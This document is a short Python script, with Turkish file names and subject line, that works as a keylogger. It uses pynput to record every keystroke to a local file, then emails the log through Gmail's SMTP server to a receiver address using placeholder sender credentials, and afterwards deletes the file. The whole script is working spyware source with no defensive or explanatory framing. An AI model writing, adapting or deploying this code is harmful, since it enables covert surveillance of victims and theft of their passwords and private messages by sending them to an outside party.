import os
import smtplib
from pynput.keyboard import Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

log_file = "klavye_gunlugu.txt"

sender_email = "gonderici@gmail.com"
sender_password = "gonderici_sifresi"
receiver_email = "alici@gmail.com"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(str(key))

def send_email():
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Günlük Klavye Günlüğü"

    with open(log_file, "r") as f:
        content = f.read()
    body = MIMEText(content)
    message.attach(body)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, message.as_string())

with Listener(on_press=on_press) as listener:
    open(log_file, "w").close()

    listener.join()

send_email()

os.remove(log_file)
